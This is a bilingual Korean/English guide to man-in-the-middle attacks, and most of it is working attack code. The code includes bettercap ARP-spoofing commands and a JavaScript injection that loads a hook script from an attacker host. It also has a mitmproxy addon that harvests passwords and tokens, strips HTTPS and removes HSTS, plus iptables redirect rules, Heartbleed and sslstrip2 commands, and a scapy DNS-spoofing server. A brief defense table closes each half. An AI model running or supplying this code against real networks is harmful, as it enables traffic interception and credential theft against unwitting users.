> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# MITM 심화 — ARP 스푸핑·SSL 스트리핑·bettercap·mitmproxy

## 1. ARP 스푸핑 원리

```
정상 통신:
  피해자 → [ARP: who has Gateway?] → 네트워크
  게이트웨이 → [ARP Reply: Gateway is AA:BB:CC] → 피해자

ARP 스푸핑 공격:
  공격자 → [ARP Reply: Gateway is ATTACKER:MAC] → 피해자
  공격자 → [ARP Reply: Victim is ATTACKER:MAC] → 게이트웨이
  → 피해자↔게이트웨이 트래픽이 공격자를 경유
```

---

## 2. bettercap으로 MITM

```bash
# bettercap 설치
apt install bettercap

# ARP 스푸핑 + 스니핑
bettercap -iface eth0 -eval "
  set arp.spoof.targets 192.168.1.100;
  arp.spoof on;
  set net.sniff.verbose false;
  net.sniff on
"

# HTTP 프록시 + 캡처
bettercap -iface eth0 << 'EOF'
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
set http.proxy.script inject.js
http.proxy on
net.sniff on
EOF

# bettercap inject.js (자바스크립트 인젝션)
# inject.js:
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') !== -1) {
        var body = res.ReadBody();
        res.Body = body.replace('</body>', '<script src="http://10.10.14.1/hook.js"></script></body>');
    }
}
```

---

## 3. mitmproxy 고급 활용

```python
#!/usr/bin/env python3
"""mitmproxy 애드온 — 트래픽 분석·수정·자격증명 탈취."""

from mitmproxy import ctx, http
import json
import re
from pathlib import Path
from datetime import datetime


CREDENTIAL_PATTERNS = {
    "password": re.compile(r"(password|passwd|pwd|pass)=([^&\s]+)", re.IGNORECASE),
    "username": re.compile(r"(username|user|email|login)=([^&\s]+)", re.IGNORECASE),
    "token": re.compile(r"(token|api_key|apikey|bearer)=([^&\s]+)", re.IGNORECASE),
}

INTERESTING_CONTENT_TYPES = {"application/json", "application/x-www-form-urlencoded"}


class CredentialHarvester:
    def __init__(self) -> None:
        self.log_file = Path("/tmp/mitm_credentials.jsonl")
        self.request_count = 0

    def response(self, flow: http.HTTPFlow) -> None:
        self.request_count += 1

    def request(self, flow: http.HTTPFlow) -> None:
        req = flow.request
        content_type = req.headers.get("Content-Type", "")
        body = req.get_text(strict=False) or ""

        found: dict[str, str] = {}

        # URL 파라미터 스캔
        for param_type, pattern in CREDENTIAL_PATTERNS.items():
            for match in pattern.finditer(req.url + "&" + body):
                found[f"{param_type}_{match.group(1)}"] = match.group(2)

        # JSON 바디 스캔
        if "application/json" in content_type:
            try:
                data = json.loads(body)
                for key, val in self._flatten_dict(data).items():
                    if any(k in key.lower() for k in ["pass", "token", "secret", "key"]):
                        found[key] = str(val)
            except json.JSONDecodeError:
                pass

        if found:
            entry = {
                "timestamp": datetime.now().isoformat(),
                "method": req.method,
                "url": req.url,
                "credentials": found,
                "host": req.host,
            }
            ctx.log.info(f"[+] 자격증명 탐지: {req.host}")
            with self.log_file.open("a") as f:
                f.write(json.dumps(entry, ensure_ascii=False) + "\n")

    def _flatten_dict(self, d: dict, prefix: str = "") -> dict:
        items: dict[str, str] = {}
        for k, v in d.items():
            key = f"{prefix}.{k}" if prefix else k
            if isinstance(v, dict):
                items.update(self._flatten_dict(v, key))
            else:
                items[key] = str(v)
        return items


class SSLStripper:
    """HTTP→HTTPS 리다이렉트를 HTTP로 다운그레이드."""

    def response(self, flow: http.HTTPFlow) -> None:
        if flow.response.status_code in (301, 302, 307, 308):
            location = flow.response.headers.get("Location", "")
            if location.startswith("https://"):
                new_location = "http://" + location[8:]
                flow.response.headers["Location"] = new_location
                ctx.log.info(f"[SSL Strip] {location} → {new_location}")

        # HSTS 헤더 제거
        flow.response.headers.pop("Strict-Transport-Security", None)


class RequestModifier:
    """요청 수정 — 헤더 추가·파라미터 변조."""

    def request(self, flow: http.HTTPFlow) -> None:
        # X-Forwarded-For 스푸핑
        flow.request.headers["X-Forwarded-For"] = "127.0.0.1"

        # User-Agent 수정
        # flow.request.headers["User-Agent"] = "Custom-Agent/1.0"


addons = [CredentialHarvester(), SSLStripper(), RequestModifier()]
```

```bash
# mitmproxy 실행
mitmproxy -s mitm_addon.py --listen-port 8080

# mitmdump (터미널 출력)
mitmdump -s mitm_addon.py --listen-port 8080

# 투명 프록시 모드 (iptables)
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8443
mitmdump --mode transparent --listen-port 8080
```

---

## 4. SSL/TLS 공격

```bash
# sslstrip2 (HSTS 우회)
git clone https://github.com/LeonardoNve/sslstrip2
python3 sslstrip2.py -l 8080

# MITM 인증서 설치 (피해자 브라우저에)
# mitmproxy CA 인증서: ~/.mitmproxy/mitmproxy-ca-cert.pem

# Heartbleed (CVE-2014-0160) — OpenSSL <= 1.0.1f
python3 heartbleed.py 10.10.10.100 443

# BEAST 공격 (TLS 1.0 CBC)
# Wireshark에서 TLS 1.0 감지 → 다운그레이드 공격

# SSL 인증서 검증 우회 확인
curl -k https://target.com  # -k: 인증서 검증 건너뜀
openssl s_client -connect target.com:443 -verify 5
```

---

## 5. DNS 스푸핑

```python
#!/usr/bin/env python3
"""DNS 스푸핑 서버 — 특정 도메인 피해자 IP로 리다이렉트."""

import argparse
import threading
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sniff


class DNSSpoofServer:
    def __init__(
        self,
        interface: str,
        target_domains: dict[str, str],
        attacker_ip: str,
    ) -> None:
        self.interface = interface
        self.target_domains = {d.rstrip("."): ip for d, ip in target_domains.items()}
        self.attacker_ip = attacker_ip

    def spoof_dns(self, pkt) -> None:
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):  # 쿼리만 처리
            return

        qname = pkt[DNSQR].qname.decode().rstrip(".")
        spoof_ip = self.target_domains.get(qname, self.target_domains.get("*"))

        if not spoof_ip:
            return

        spoof_pkt = (
            IP(dst=pkt[IP].src, src=pkt[IP].dst)
            / UDP(dport=pkt[UDP].sport, sport=53)
            / DNS(
                id=pkt[DNS].id,
                qr=1, aa=1, qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=spoof_ip),
            )
        )
        send(spoof_pkt, verbose=False)
        print(f"[+] DNS 스푸핑: {qname} → {spoof_ip}")

    def start(self) -> None:
        print(f"[*] DNS 스푸핑 시작 (인터페이스: {self.interface})")
        sniff(
            iface=self.interface,
            filter="udp port 53",
            prn=self.spoof_dns,
            store=False,
        )


def main() -> None:
    parser = argparse.ArgumentParser(description="DNS 스푸핑 서버")
    parser.add_argument("-i", "--interface", required=True, help="네트워크 인터페이스")
    parser.add_argument("-d", "--domain", action="append",
                        help="도메인=IP 쌍 (예: bank.com=10.10.14.1)")
    parser.add_argument("--attacker-ip", required=True)
    args = parser.parse_args()

    domains: dict[str, str] = {}
    for item in (args.domain or []):
        if "=" in item:
            d, ip = item.split("=", 1)
            domains[d] = ip

    if not domains:
        domains["*"] = args.attacker_ip

    server = DNSSpoofServer(args.interface, domains, args.attacker_ip)
    server.start()


if __name__ == "__main__":
    main()
```

---

## 6. MITM 탐지 방어

| 공격 | 탐지 방법 | 방어 |
|------|-----------|------|
| ARP 스푸핑 | ARP 테이블 변화 모니터링 | 정적 ARP·DAI (Dynamic ARP Inspection) |
| SSL 스트리핑 | HTTP 접속 경고 | HSTS Preload·CSP |
| DNS 스푸핑 | DNSSEC 검증 | DNSSEC·DoH (DNS over HTTPS) |
| 가짜 CA | 인증서 핀닝 | Certificate Pinning·CT 로그 |

---

<a name="english"></a>

# MITM Advanced — ARP Spoofing · SSL Stripping · bettercap · mitmproxy

## 1. ARP Spoofing Principles

```
Normal communication:
  Victim → [ARP: who has Gateway?] → Network
  Gateway → [ARP Reply: Gateway is AA:BB:CC] → Victim

ARP Spoofing Attack:
  Attacker → [ARP Reply: Gateway is ATTACKER:MAC] → Victim
  Attacker → [ARP Reply: Victim is ATTACKER:MAC] → Gateway
  → Victim↔Gateway traffic is now routed through the attacker
```

---

## 2. MITM with bettercap

```bash
# Install bettercap
apt install bettercap

# ARP spoofing + sniffing
bettercap -iface eth0 -eval "
  set arp.spoof.targets 192.168.1.100;
  arp.spoof on;
  set net.sniff.verbose false;
  net.sniff on
"

# HTTP proxy + capture
bettercap -iface eth0 << 'EOF'
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
set http.proxy.script inject.js
http.proxy on
net.sniff on
EOF

# bettercap inject.js (JavaScript injection)
# inject.js:
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') !== -1) {
        var body = res.ReadBody();
        res.Body = body.replace('</body>', '<script src="http://10.10.14.1/hook.js"></script></body>');
    }
}
```

---

## 3. Advanced mitmproxy Usage

```python
#!/usr/bin/env python3
"""mitmproxy addon — traffic analysis, modification, and credential harvesting."""

from mitmproxy import ctx, http
import json
import re
from pathlib import Path
from datetime import datetime


CREDENTIAL_PATTERNS = {
    "password": re.compile(r"(password|passwd|pwd|pass)=([^&\s]+)", re.IGNORECASE),
    "username": re.compile(r"(username|user|email|login)=([^&\s]+)", re.IGNORECASE),
    "token": re.compile(r"(token|api_key|apikey|bearer)=([^&\s]+)", re.IGNORECASE),
}

INTERESTING_CONTENT_TYPES = {"application/json", "application/x-www-form-urlencoded"}


class CredentialHarvester:
    def __init__(self) -> None:
        self.log_file = Path("/tmp/mitm_credentials.jsonl")
        self.request_count = 0

    def response(self, flow: http.HTTPFlow) -> None:
        self.request_count += 1

    def request(self, flow: http.HTTPFlow) -> None:
        req = flow.request
        content_type = req.headers.get("Content-Type", "")
        body = req.get_text(strict=False) or ""

        found: dict[str, str] = {}

        # Scan URL parameters
        for param_type, pattern in CREDENTIAL_PATTERNS.items():
            for match in pattern.finditer(req.url + "&" + body):
                found[f"{param_type}_{match.group(1)}"] = match.group(2)

        # Scan JSON body
        if "application/json" in content_type:
            try:
                data = json.loads(body)
                for key, val in self._flatten_dict(data).items():
                    if any(k in key.lower() for k in ["pass", "token", "secret", "key"]):
                        found[key] = str(val)
            except json.JSONDecodeError:
                pass

        if found:
            entry = {
                "timestamp": datetime.now().isoformat(),
                "method": req.method,
                "url": req.url,
                "credentials": found,
                "host": req.host,
            }
            ctx.log.info(f"[+] Credential detected: {req.host}")
            with self.log_file.open("a") as f:
                f.write(json.dumps(entry, ensure_ascii=False) + "\n")

    def _flatten_dict(self, d: dict, prefix: str = "") -> dict:
        items: dict[str, str] = {}
        for k, v in d.items():
            key = f"{prefix}.{k}" if prefix else k
            if isinstance(v, dict):
                items.update(self._flatten_dict(v, key))
            else:
                items[key] = str(v)
        return items


class SSLStripper:
    """Downgrade HTTP→HTTPS redirects back to HTTP."""

    def response(self, flow: http.HTTPFlow) -> None:
        if flow.response.status_code in (301, 302, 307, 308):
            location = flow.response.headers.get("Location", "")
            if location.startswith("https://"):
                new_location = "http://" + location[8:]
                flow.response.headers["Location"] = new_location
                ctx.log.info(f"[SSL Strip] {location} → {new_location}")

        # Remove HSTS header
        flow.response.headers.pop("Strict-Transport-Security", None)


class RequestModifier:
    """Request modification — add headers, tamper parameters."""

    def request(self, flow: http.HTTPFlow) -> None:
        # X-Forwarded-For spoofing
        flow.request.headers["X-Forwarded-For"] = "127.0.0.1"

        # Modify User-Agent
        # flow.request.headers["User-Agent"] = "Custom-Agent/1.0"


addons = [CredentialHarvester(), SSLStripper(), RequestModifier()]
```

```bash
# Run mitmproxy
mitmproxy -s mitm_addon.py --listen-port 8080

# mitmdump (terminal output)
mitmdump -s mitm_addon.py --listen-port 8080

# Transparent proxy mode (iptables)
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8443
mitmdump --mode transparent --listen-port 8080
```

---

## 4. SSL/TLS Attacks

```bash
# sslstrip2 (HSTS bypass)
git clone https://github.com/LeonardoNve/sslstrip2
python3 sslstrip2.py -l 8080

# Install MITM certificate (on victim's browser)
# mitmproxy CA certificate: ~/.mitmproxy/mitmproxy-ca-cert.pem

# Heartbleed (CVE-2014-0160) — OpenSSL <= 1.0.1f
python3 heartbleed.py 10.10.10.100 443

# BEAST Attack (TLS 1.0 CBC)
# Detect TLS 1.0 in Wireshark → downgrade attack

# Check SSL certificate validation bypass
curl -k https://target.com  # -k: skip certificate verification
openssl s_client -connect target.com:443 -verify 5
```

---

## 5. DNS Spoofing

```python
#!/usr/bin/env python3
"""DNS spoofing server — redirect specific domains to attacker IP."""

import argparse
import threading
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sniff


class DNSSpoofServer:
    def __init__(
        self,
        interface: str,
        target_domains: dict[str, str],
        attacker_ip: str,
    ) -> None:
        self.interface = interface
        self.target_domains = {d.rstrip("."): ip for d, ip in target_domains.items()}
        self.attacker_ip = attacker_ip

    def spoof_dns(self, pkt) -> None:
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):  # process queries only
            return

        qname = pkt[DNSQR].qname.decode().rstrip(".")
        spoof_ip = self.target_domains.get(qname, self.target_domains.get("*"))

        if not spoof_ip:
            return

        spoof_pkt = (
            IP(dst=pkt[IP].src, src=pkt[IP].dst)
            / UDP(dport=pkt[UDP].sport, sport=53)
            / DNS(
                id=pkt[DNS].id,
                qr=1, aa=1, qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=spoof_ip),
            )
        )
        send(spoof_pkt, verbose=False)
        print(f"[+] DNS Spoofed: {qname} → {spoof_ip}")

    def start(self) -> None:
        print(f"[*] DNS spoofing started (interface: {self.interface})")
        sniff(
            iface=self.interface,
            filter="udp port 53",
            prn=self.spoof_dns,
            store=False,
        )


def main() -> None:
    parser = argparse.ArgumentParser(description="DNS Spoofing Server")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-d", "--domain", action="append",
                        help="domain=IP pair (e.g. bank.com=10.10.14.1)")
    parser.add_argument("--attacker-ip", required=True)
    args = parser.parse_args()

    domains: dict[str, str] = {}
    for item in (args.domain or []):
        if "=" in item:
            d, ip = item.split("=", 1)
            domains[d] = ip

    if not domains:
        domains["*"] = args.attacker_ip

    server = DNSSpoofServer(args.interface, domains, args.attacker_ip)
    server.start()


if __name__ == "__main__":
    main()
```

---

## 6. MITM Detection and Defense

| Attack | Detection Method | Defense |
|--------|-----------------|---------|
| ARP Spoofing | Monitor ARP table changes | Static ARP · DAI (Dynamic ARP Inspection) |
| SSL Stripping | HTTP connection warning | HSTS Preload · CSP |
| DNS Spoofing | DNSSEC validation | DNSSEC · DoH (DNS over HTTPS) |
| Fake CA | Certificate pinning | Certificate Pinning · CT logs |
